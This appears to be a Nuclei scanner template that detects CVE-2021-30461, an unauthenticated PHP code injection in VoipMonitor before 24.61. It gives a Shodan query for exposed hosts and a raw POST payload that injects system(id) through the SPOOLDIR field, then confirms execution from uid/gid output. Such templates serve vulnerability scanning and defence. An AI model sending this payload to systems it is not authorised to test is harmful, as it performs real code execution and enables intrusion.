id: CVE-2021-30461
info:
  name: VoipMonitor <24.61 - Remote Code Execution
  author: shifacyclewala,hackergautam
  severity: critical
  description: VoipMonitor versions prior to 24.61 have a vulnerability (CVE-2021-30461)
    that allows remote unauthenticated users to execute PHP code via the web interface.
  reference:
  - https://ssd-disclosure.com/ssd-advisory-voipmonitor-unauth-rce/
  - https://nvd.nist.gov/vuln/detail/CVE-2021-30461
  - https://ssd-disclosure.com/ssd-advisory--voipmonitor-unauth-rce
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2021-30461
    cwe-id: CWE-94
  metadata:
    shodan-query: http.title:"VoIPmonitor"
    impact: The impact of CVE-2021-30461 is a potential vulnerability of the VoipMonitor
      software, which could allow unauthorized users to execute harmful code on systems
      connected to the software.
    recommendation: It is recommended to update VoipMonitor to version 24.61 or higher
      to prevent the risk of remote code execution vulnerabilities.
  tags: cve,cve2021,rce,voipmonitor
requests:
- raw:
  - 'POST /index.php HTTP/1.1

    Host: {{Hostname}}

    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8

    Content-Type: application/x-www-form-urlencoded


    SPOOLDIR=test".system(id)."&recheck=Recheck

    '
  matchers-condition: and
  matchers:
  - type: word
    words:
    - uid=
    - gid=
    - groups=
    - VoIPmonitor installation
    part: body
    condition: and
  - type: status
    status:
    - 200
